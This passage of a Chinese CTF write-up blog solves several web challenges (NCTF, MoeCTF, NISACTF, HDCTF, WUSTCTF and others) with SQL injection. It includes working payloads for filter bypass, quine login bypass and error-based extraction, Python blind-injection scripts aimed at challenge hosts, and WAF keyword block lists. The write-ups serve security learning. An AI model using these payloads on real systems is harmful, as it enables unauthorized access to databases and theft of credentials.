<p>同样的功能join来实现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select u.*,e.* from users u join emails e on u.id=e.id</span><br></pre></td></tr></table></figure>
<p>使用join：<br>union select 1,2,3等价于<br>union select * from (select 1)a join (select 2)b  join (select 3)c<br>后面的注入的手法是一样的<br>最后payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt=-1&#x27;||extractvalue(1,concat(0x7e,(select *from (select *from output a join output b)c)))#</span><br></pre></td></tr></table></figure>
<p>回显：Duplicate column name ‘data’</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt=1&#x27;||(extractvalue(&#x27;div&#x27;, concat(&#x27;~&#x27;,(select * from(select * from Fal_flag a join Fal_flag b )c),&#x27;hi&#x27;)))#</span><br></pre></td></tr></table></figure>
<p>回显的列是id，后面还有一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt=1&#x27;||(extractvalue(&#x27;div&#x27;, concat(&#x27;~&#x27;,(select * from(select * from Fal_flag a join Fal_flag b using(id))c),&#x27;hi&#x27;)))#</span><br></pre></td></tr></table></figure>
<p>回显data</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt=1&#x27;||extractvalue(1,concat(0x7e,(select * from (select * from Fal_flag a join Fal_flag b using(id,data)) c)))#</span><br></pre></td></tr></table></figure>
<p>这个就回显了一个假的flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt=1&#x27;||extractvalue(1,concat(0x7e,(select * from (select * from output a join output b using(data)) c)))#</span><br></pre></td></tr></table></figure>
<p>这个就回显了我们要的,但是长度只是一部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt=1&#x27;||extractvalue(1,concat(0x7e,mid((select data from output),1,30)))#</span><br></pre></td></tr></table></figure>
<p>两次成功拿到flag</p>
<h1 id="NCTF-2018-滴-晨跑打卡"><a href="#NCTF-2018-滴-晨跑打卡" class="headerlink" title="[NCTF 2018]滴!晨跑打卡"></a>[NCTF 2018]滴!晨跑打卡</h1><p>1分<br>空格绕过SQL注入报错注入<br>题目描述</p>
<p>快来看看你每次跑操打卡的信息鸭！<br>这个是常规注入，我们这里稍微注意一下一些东西就可以了<br>这里的空格用%a0来进行绕过<br>最后的闭合符用一个’<br>前面的分号也可以换为%27</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%27%a0union%a0select%a01,2,3,4%a0and%a0%271%27=%271</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询语句最后就是select * from websites where id=&#x27;1&#x27;&#x27;&#x27;;</span><br></pre></td></tr></table></figure>
<p>这里建议打开phpstudy开启阿帕奇和mysql<br>然后我进入phpmyadmin<br>再进入employees数据库里，里面有一章表user<br>输入语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=&#x27;1&#x27;&#x27;&#x27;;</span><br></pre></td></tr></table></figure>
<p>能够得到正常回显<br>最后就是常规注入拿到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;%a0union%a0select%a01,2,3,4&#x27;</span><br><span class="line">回显123</span><br><span class="line"></span><br><span class="line">id=1&#x27;%a0union%a0select%a01,2,(select%a0group_concat(table_name)from%a0information_schema.tables%a0where%a0table_schema=database()),4&#x27;</span><br><span class="line">得到表名是pcnumber</span><br><span class="line"></span><br><span class="line">?id=1&#x27;%a0union%a0select%a01,2,(select%a0group_concat(column_name)from%a0information_schema.columns%a0where%a0table_schema=database()%a0and%a0table_name=&#x27;pcnumber&#x27;),4&#x27;</span><br><span class="line">得到字段id,bigtime,smalltime,flag</span><br><span class="line"></span><br><span class="line">?id=1&#x27;%a0union%a0select%a01,2,(select%a0group_concat(flag)from%a0pcnumber),4&#x27;</span><br><span class="line">获取flag</span><br></pre></td></tr></table></figure>
<h1 id="MoeCTF-2022-Sqlmap-boy"><a href="#MoeCTF-2022-Sqlmap-boy" class="headerlink" title="[MoeCTF 2022]Sqlmap_boy"></a>[MoeCTF 2022]Sqlmap_boy</h1><p>1分<br>SQL注入关键字绕过空格绕过<br>题目描述</p>
<p><a target="_blank" rel="noopener" href="https://github.com/XDSEC/MoeCTF_2022">https://github.com/XDSEC/MoeCTF_2022</a></p>
<p>进去是一个登陆界面，且不给注册<br>查看网页源代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $sql = &#x27;select username,password from users where username=&quot;&#x27;.$username.&#x27;&quot; &amp;&amp; password=&quot;&#x27;.$password.&#x27;&quot;;&#x27;; --&gt;</span><br></pre></td></tr></table></figure>
<p>就是比较常规的注入，我们在这里注意，一开始登进去用万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;&quot; or 1=1#</span><br></pre></td></tr></table></figure>
<p>然后进入<a target="_blank" rel="noopener" href="http://node5.anna.nssctf.cn:29134/secrets.php?id=1">http://node5.anna.nssctf.cn:29134/secrets.php?id=1</a><br>这里及开始对id处进行注入<br>paoyload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secrets.php?id=-1&#x27;%20union%20select%201,database(),group_concat(flAg) from moectf.flag--+</span><br></pre></td></tr></table></figure>
<p>这里再强调一个地方<br>就是用moectf.flag是标准的sql语法，后面要简洁也可以这样用</p>
<h1 id="NSSCTF-2022-Spring-Recruit-babysql"><a href="#NSSCTF-2022-Spring-Recruit-babysql" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babysql"></a>[NSSCTF 2022 Spring Recruit]babysql</h1><p>1分<br>SQL注入空格绕过关键字绕过<br>这里来一个完整的过程的注入<br>之前的基本都快速看了下思路就草草了之了<br>一开始进入，只有一个登录框，有一个登陆界面<br>输入admin<br>抓包：username&#x3D;admin<br>回显：竟然是死胡同(沮丧)<br>我们先来一个’,再来一个1好像都是回显，竟然是死胡同(沮丧)<br>我们来万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or 1=1#</span><br></pre></td></tr></table></figure>
<p>这里就有我们需要的信息了，过滤了if,and，#还有s。不分区大小写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker!!black_list is /if|and|\s|#|--/i</span><br></pre></td></tr></table></figure>
<p>这里我的理解稍微有一些问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--也给过滤了</span><br></pre></td></tr></table></figure>
<p>这里又是我没有见过的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
<p>回显：string(39) “前有flag,所以,是绕过的时候了”<br>这里基本就可以来拿flag了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-a&#x27;/**/union/**/select/**/(select/**/database())&#x27;</span><br><span class="line">-a&#x27;/**/union/**/select/**/(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;test&#x27;)&#x27;</span><br><span class="line">-a&#x27;/**/union/**/select/**/(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;)&#x27;</span><br><span class="line">-a&#x27;/**/union/**/select/**/(select/**/group_concat(flag)/**/from/**/test.flag)&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里的payload都是两个select，是有讲究的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">你写的这条 SQL 注入 payload：</span><br><span class="line"></span><br><span class="line">username=1&#x27;union/**/select/**/(select/**/group_concat(flag)/**/from/**/flag)/**/&#x27;</span><br><span class="line"></span><br><span class="line">里面确实出现了 两个 SELECT，很多初学者第一次看到会觉得困惑。下面我给你详细讲一下这个写法的 原理、用途和典型场景。</span><br><span class="line">✅ 一、这条语句的结构</span><br><span class="line"></span><br><span class="line">我们可以先去掉注释和空格绕过的干扰，还原成原始结构：</span><br><span class="line"></span><br><span class="line">username = &#x27;1&#x27; UNION SELECT (SELECT group_concat(flag) FROM flag) --&#x27;</span><br><span class="line"></span><br><span class="line">这是典型的 嵌套子查询（Subquery）。</span><br><span class="line">🔍 二、结构解释</span><br><span class="line">外层：</span><br><span class="line"></span><br><span class="line">UNION SELECT (...)</span><br><span class="line"></span><br><span class="line">表示要将子查询的结果（一个值）作为 UNION 的返回内容。</span><br><span class="line">内层：</span><br><span class="line"></span><br><span class="line">(SELECT group_concat(flag) FROM flag)</span><br><span class="line"></span><br><span class="line">表示从 flag 表中取出所有 flag 字段值并用逗号拼接起来，结果是一个单个字符串（比如：flag&#123;xxx&#125;,flag&#123;yyy&#125;）</span><br><span class="line">📌 三、为什么要这样写（两层 SELECT 的作用）</span><br><span class="line">✅ 主要用途：</span><br><span class="line"></span><br><span class="line">    当前注入点只允许返回一列</span><br><span class="line">    如果目标页面的原始 SQL 是：</span><br><span class="line"></span><br><span class="line">    SELECT username FROM users WHERE username = &#x27;$username&#x27;</span><br><span class="line"></span><br><span class="line">    那么 UNION SELECT 也只能提供一列。如果你写 UNION SELECT flag FROM flag 这样返回多行/多列，可能报错或格式错位。</span><br><span class="line"></span><br><span class="line">    这时候，你就需要用子查询把多行合并成一行：</span><br><span class="line">    SELECT group_concat(flag) FROM flag → 结果是一个字符串</span><br><span class="line"></span><br><span class="line">    需要将查询结果当作值返回</span><br><span class="line">    比如你要用 SELECT (...) 的结果作为一列或一个函数参数，嵌套写法是必要的。</span><br><span class="line"></span><br><span class="line">🧠 四、补充说明</span><br><span class="line">示例：单列注入 vs 多列注入</span><br><span class="line"></span><br><span class="line">    如果注入点原语句是：</span><br><span class="line"></span><br><span class="line">SELECT name FROM users WHERE name = &#x27;$username&#x27;</span><br><span class="line"></span><br><span class="line">→ 则你必须 UNION SELECT (SELECT group_concat(flag) FROM flag)</span><br><span class="line"></span><br><span class="line">如果原始 SQL 是多列，比如：</span><br><span class="line"></span><br><span class="line">SELECT id, name FROM users WHERE id = &#x27;$id&#x27;</span><br><span class="line"></span><br><span class="line">→ 你就可以直接：</span><br><span class="line"></span><br><span class="line">    UNION SELECT 1, group_concat(flag) FROM flag</span><br><span class="line"></span><br><span class="line">✅ 总结</span><br><span class="line">场景	是否需要两层 SELECT</span><br><span class="line">目标页面只返回一列	✔ 是</span><br><span class="line">你想把多行合并成一行	✔ 是</span><br><span class="line">你需要控制列数/防止报错	✔ 是</span><br><span class="line">原语句是多列的	❌ 不一定需要</span><br><span class="line"></span><br><span class="line">要不要我帮你判断你那个注入点是几列的，或者用别的写法验证注入成功？</span><br></pre></td></tr></table></figure>
<h1 id="NISACTF-2022-hardsql"><a href="#NISACTF-2022-hardsql" class="headerlink" title="[NISACTF 2022]hardsql"></a>[NISACTF 2022]hardsql</h1><p>1分<br>quine注入SQL注入空格绕过<br>题目描述</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$password=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">$sql=&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;$password&#x27;;&quot;;</span><br></pre></td></tr></table></figure>
<p>这个也是一个quine注入的题目，我们来尝试解决</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">登进去显示成功登陆即可显示flag,有两个登录框</span><br></pre></td></tr></table></figure>
<p>我先尝试随便登录一下，显示only bilala can login<br>这里就给你账号了<br>抓包是这样显示的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=bilala&amp;passwd=1&amp;login=%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;B&quot;,char(34),char(39)),char(66),&quot;B&quot;)#&#x27;,char(34),char(39)),char(66),&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;B&quot;,char(34),char(39)),char(66),&quot;B&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>
<p>发现这个不可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;,0x22,0x27),0x25,&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>
<p>这个payload和我的第一个的payload是一样的<br>最后拿到flag<br>还有一个就是我们可以使用脚本来得到账号密码,但是是给了你源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">alp = &quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~&quot;</span><br><span class="line">def get_pass():</span><br><span class="line">    url = &quot;http://1.14.71.254:28843/login.php&quot;</span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line">    Cookie = &#123;&#x27;frontLang&#x27;:&#x27;zh - cn&#x27;,</span><br><span class="line">    &#x27;frontDevice&#x27;:&#x27;desktop&#x27;,</span><br><span class="line">    &#x27;theme&#x27; : &#x27;default&#x27;,</span><br><span class="line">    &#x27;adminLang&#x27; : &#x27;zh - cn&#x27;,</span><br><span class="line">    &#x27;adminDevice&#x27; : &#x27;desktop&#x27;,</span><br><span class="line">    &#x27;currentGroup&#x27;: &#x27;design&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    while(True):</span><br><span class="line">        for i in alp:</span><br><span class="line">            data = &#123;</span><br><span class="line">                &#x27;username&#x27;: &#x27;bilala&#x27;,</span><br><span class="line">                &#x27;passwd&#x27;:f&quot;1&#x27;or/**/passwd/**/like/**/&#x27;&#123;flag+i&#125;%&#x27;#&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            res = requests.post(url=url,data=data)</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">            if &quot;nothing found&quot; not in res.text:</span><br><span class="line">                flag+=i</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line">            elif &quot;~&quot; in i:</span><br><span class="line">                return</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    get_pass()</span><br></pre></td></tr></table></figure>
<p>源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//多加了亿点点过滤</span><br><span class="line"> </span><br><span class="line">include_once(&quot;config.php&quot;);</span><br><span class="line">function alertMes($mes,$url)&#123;</span><br><span class="line">    die(&quot;&lt;script&gt;alert(&#x27;&#123;$mes&#125;&#x27;);location.href=&#x27;&#123;$url&#125;&#x27;;&lt;/script&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function checkSql($s) &#123;</span><br><span class="line">    if(preg_match(&quot;/if|regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|insert|database|reverse|update|extractvalue|floor|join|substr|&amp;|;|\\\$|char|\x0a|\x09|column|sleep|\ /i&quot;,$s))&#123;</span><br><span class="line">        alertMes(&#x27;waf here&#x27;, &#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;] != &#x27;&#x27; &amp;&amp; isset($_POST[&#x27;passwd&#x27;]) &amp;&amp; $_POST[&#x27;passwd&#x27;] != &#x27;&#x27;) &#123;</span><br><span class="line">    $username=$_POST[&#x27;username&#x27;];</span><br><span class="line">    $password=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">    if ($username !== &#x27;bilala&#x27;) &#123;</span><br><span class="line">        alertMes(&#x27;only bilala can login&#x27;, &#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    checkSql($password);</span><br><span class="line">    $sql=&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;$password&#x27;;&quot;;</span><br><span class="line">    $user_result=mysqli_query($MysqlLink,$sql);</span><br><span class="line">    $row = mysqli_fetch_array($user_result);</span><br><span class="line">    if (!$row) &#123;</span><br><span class="line">        alertMes(&#x27;nothing found&#x27;,&#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($row[&#x27;passwd&#x27;] === $password) &#123;</span><br><span class="line">        if($password == &#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;)&#123;</span><br><span class="line">            show_source(__FILE__);</span><br><span class="line">            die;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die($FLAG);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>主要就是要强相等这个方面</p>
<h1 id="HDCTF-2023-LoginMaster"><a href="#HDCTF-2023-LoginMaster" class="headerlink" title="[HDCTF 2023]LoginMaster"></a>[HDCTF 2023]LoginMaster</h1><p>1分<br>quine注入unique注入SQL注入<br>题目描述</p>
<p>Who knows logining better than you!<br>这个好像也是quine注入的，再来一道巩固一下，主要是为了减少知道是这种情况，但是可能有一些不一样的waf，这种题就做不出来了。还是说这种题目就一种解法<br>一来是一个登陆页面，要输入账户名和密码<br>访问robots.txt<br>有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function checkSql($s) </span><br><span class="line">&#123;</span><br><span class="line">    if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;,$s))&#123;</span><br><span class="line">        alertMes(&#x27;hacker&#x27;, &#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if ($row[&#x27;password&#x27;] === $password) &#123;</span><br><span class="line">        die($FLAG);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);</span><br></pre></td></tr></table></figure>
<p>要我们输入的password&#x3D;&#x3D;&#x3D;等于$password,这个就是quine注入的一个标志<br>我们先抓包来随便登陆一下<br>显示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(&#x27;something wrong&#x27;);location.href=&#x27;index.php&#x27;;</span><br></pre></td></tr></table></figure>
<p>本题的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/replace(replace(&#x27;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>
<p>对于这些注入的格式呀，我的理解还是有很大的不足的，我得多尝试手搓一下</p>
<h1 id="WUSTCTF-2020-颜值成绩查询"><a href="#WUSTCTF-2020-颜值成绩查询" class="headerlink" title="[WUSTCTF 2020]颜值成绩查询"></a>[WUSTCTF 2020]颜值成绩查询</h1><p>1分<br>布尔盲注SQL注入空格绕过<br>这个是bool盲注的，稍微修改一下payload就可以用于解题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &#x27;http://cd82b63c-6c9a-46d7-8288-09fea5ba97f3.node5.buuoj.cn:81/?stunum=&#x27;</span><br><span class="line">i = 0</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">while True:</span><br><span class="line">    i += 1</span><br><span class="line">    # 从可打印字符开始</span><br><span class="line">    begin = 32</span><br><span class="line">    end = 126</span><br><span class="line">    tmp = (begin + end) // 2</span><br><span class="line">    while begin &lt; end:</span><br><span class="line">        print(begin, tmp, end)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        # 爆数据库</span><br><span class="line">        # payload = &quot;1/**/and/**/(ascii(substr(database(),%d,1))&gt;%d)&quot; % (i, tmp)</span><br><span class="line">        # 爆表</span><br><span class="line">        # payload = &quot;1/**/and/**/(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),%d,1))&gt;%d)&quot; % (i, tmp)</span><br><span class="line">        # 爆字段</span><br><span class="line">        # payload = &quot;&#x27;&#x27;or(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME=&#x27;flag&#x27;)),%d,1))&gt;%d)&quot; % (i, tmp)</span><br><span class="line">        # 爆flag</span><br><span class="line">        # payload = &quot;1/**/and/**/(ascii(substr((select(group_concat(value))from(flag)),%d,1))&gt;%d)&quot; % (i, tmp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        if &#x27;admin&#x27; in r.text:</span><br><span class="line">            begin = tmp + 1</span><br><span class="line">            tmp = (begin + end) // 2</span><br><span class="line">        else:</span><br><span class="line">            end = tmp</span><br><span class="line">            tmp = (begin + end) // 2</span><br><span class="line"></span><br><span class="line">    flag += chr(tmp)</span><br><span class="line">    print(flag)</span><br><span class="line">    if begin == 32:</span><br><span class="line">        break</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>成功拿到flag</p>
<h1 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="[October 2019]Twice SQL Injection"></a>[October 2019]Twice SQL Injection</h1><p>1分<br>二次注入SQL注入URL污染<br>这个也是第一次遇到相关的注入类型的题目，二次注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select database()# //爆库</span><br><span class="line">1&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctftraining&#x27;#   //爆表</span><br><span class="line">1&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;#  //爆字段</span><br><span class="line">1&#x27; union select flag from flag# //爆数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先登陆，再注册，最后拿到flag</p>
<h1 id="HNCTF-2022-WEEK2-easy-sql"><a href="#HNCTF-2022-WEEK2-easy-sql" class="headerlink" title="[HNCTF 2022 WEEK2]easy_sql"></a>[HNCTF 2022 WEEK2]easy_sql</h1><p>36分<br>SQL注入无列名注入空格绕过<br>又是一个无列名的注入<br>之前也遇见过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/Jayjay___/article/details/132956781?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522a9434f3f1a2484704690c128072f60ab%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=a9434f3f1a2484704690c128072f60ab&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-132956781-null-null.142^v102^pc_search_result_base4&amp;utm_term=%5BHNCTF%202022%20WEEK2%5Deasy_sql&amp;spm=1018.2226.3001.4187</span><br></pre></td></tr></table></figure>
<p>参考一下这篇文章的解法和脚本</p>
